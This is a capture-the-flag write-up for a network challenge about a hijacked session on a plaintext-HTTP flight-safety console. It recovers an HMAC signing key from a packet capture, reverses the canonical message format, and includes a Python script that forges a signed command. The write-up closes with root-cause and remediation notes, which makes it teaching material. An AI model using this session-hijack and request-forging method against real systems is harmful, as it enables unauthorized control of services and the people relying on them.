### Hard Landing

> Network · Easy · Teodor Giurgica
> Points at solve: [fill in]

**Tools used**

gzip decompression of PCAP payloads, Python 3 (`hmac`, `hashlib`, `urllib`).

**Approach**

A flight-safety console that supports an allied air base in the Operation Dawn theatre accepted destructive commands from a workstation its administrator never used. New logins are disabled, but the exposed session is still live. The task: review the incident capture and access log, recover the administrator's session material, then issue the documented safe recovery command with a fresh valid signature.

Target: `http://<instance>/`
Files: `console.pcapng`, `console_access.log`, `ops_notes.txt`

Recon:

From `ops_notes.txt`: console at `192.0.2.20`, admin workstation at `192.0.2.11`; HTTP only — **no TLS**; command auth is **session-bound HMAC-SHA256** with a server-time freshness window; new logins disabled; admin session **still live**; the goal is to determine how the session moved to `192.0.2.14`.

From `console_access.log`:

```
2026-09-17T11:22:00Z  LOGIN  192.0.2.11  session=<redacted>  result=issued
2026-09-17T11:22:08Z  COMMAND  192.0.2.11  session=adm-...  command=STATUS
2026-09-17T11:23:00Z  COMMAND  192.0.2.14  session=adm-...  command=DISABLE_SAFETY_LINK
2026-09-17T11:23:06Z  COMMAND  192.0.2.14  session=adm-...  command=DIVERT_FROM_CORRIDOR
2026-09-17T11:23:12Z  COMMAND  192.0.2.14  session=adm-...  command=SUPPRESS_RECOVERY
2026-09-17T11:23:17Z  AIRCRAFT_LINK_LOST  aircraft=N17
```

The admin session was issued to `192.0.2.11` but `192.0.2.14` immediately used it for three destructive commands. Classic **session hijack over plaintext HTTP**.

Step 1 — Recover the HMAC key from the PCAP:

The login response from `192.0.2.20 → 192.0.2.11` is `Content-Encoding: gzip`. Decompressing the body reveals:

```json
{
  "session": "<redacted>",
  "key": "<redacted>",
  "role": "administrator"
}
```

The console hands the HMAC signing key back in the login response in cleartext — anyone on the same network segment who can read the response has everything needed to forge commands.

Step 2 — Reverse the signing scheme:

The PCAP contains several known `(timestamp, body, signature)` triples. Testing all orderings and separators of `{session, method, path, timestamp, body}` against two independent data points (operator + administrator) finds:

Canonical message:

```
POST\n/api/command\n<X-Timestamp>\n<body>
```

Key: 32 raw bytes decoded from the 64-char lowercase hex key string.
Algorithm: HMAC-SHA256.

Verification with the administrator's STATUS command:

```python
import hmac, hashlib

key  = bytes.fromhex("<redacted>")
msg  = "POST\n/api/command\n1789644128\n{\"cmd\":\"STATUS\",\"aircraft\":\"N17\"}"
sig  = hmac.new(key, msg.encode(), hashlib.sha256).hexdigest()
# e1794c7c3dfe6634c17d8d0a16edd8dbe43523ef7a5f6d838fc2ae86cacb6375  ✓
```

Step 3 — Get the recovery command:

`GET /api/status` is unauthenticated:

```json
{
  "service": "Sentinel flight-safety console",
  "state": "lockdown",
  "login": "disabled",
  "server_time": 1794009365,
  "freshness_seconds": 300,
  "request": {
    "method": "POST",
    "path": "/api/command",
    "canonical": "POST\n/api/command\n<X-Timestamp>\n<BODY>",
    "hmac": "HMAC-SHA256; decode the login JSON's exactly 64 lowercase hexadecimal key characters to 32 bytes before use",
    "body": "{\"cmd\":\"RETURN_TO_PAD\",\"pad\":\"A1\"}"
  }
}
```

Safe recovery command: `{"cmd":"RETURN_TO_PAD","pad":"A1"}`.

Step 4 — Forge and submit:

```python
import hmac, hashlib, urllib.request, json

key     = bytes.fromhex("<redacted>")
session = "<redacted>"
body    = '{"cmd":"RETURN_TO_PAD","pad":"A1"}'

# Fresh timestamp from server
with urllib.request.urlopen("http://<instance>/api/status") as r:
    ts = str(json.loads(r.read())["server_time"])

sig = hmac.new(key, f"POST\n/api/command\n{ts}\n{body}".encode(), hashlib.sha256).hexdigest()

req = urllib.request.Request(
    "http://<instance>/api/command",
    data=body.encode(),
    headers={
        "Content-Type":  "application/json",
        "X-Session":     session,
        "X-Timestamp":   ts,
        "X-Signature":   sig,
        "User-Agent":    "sentinel-workstation/1.0",
    },
    method="POST"
)
with urllib.request.urlopen(req) as r:
    print(r.read().decode())
```

Response:

```json
{
  "status": "aircraft returned to pad A1",
  "recovery_receipt": "CSCTF{REDACTED}"
}
```

**Why it works**

Root cause: the console transmitted its command-signing material in cleartext and inside the login response itself, so any passive observer on the network segment could recover both the session token and the HMAC key, then forge arbitrary signed commands. Specific weaknesses:

- **No TLS** — the HMAC key and session token were transmitted in cleartext.
- **Key in login response** — the signing key is returned to the client; any observer can forge commands.
- **No source-IP binding** — a session issued to `192.0.2.11` was accepted from `192.0.2.14` without challenge.

Because the canonical message format is predictable (`POST\n/api/command\n<timestamp>\n<body>`) and unauthenticated `GET /api/status` discloses the required body and freshness window, forging the documented safe recovery command is straightforward once the key is known.

Remediation: serve the console over TLS; never return signing keys to clients (keep key material server-side); bind sessions to source identity or require re-authentication for destructive commands.

**Validation**

The forged `POST /api/command` was accepted and the console returned a `recovery_receipt` containing the flag; the flag was accepted as the solution.
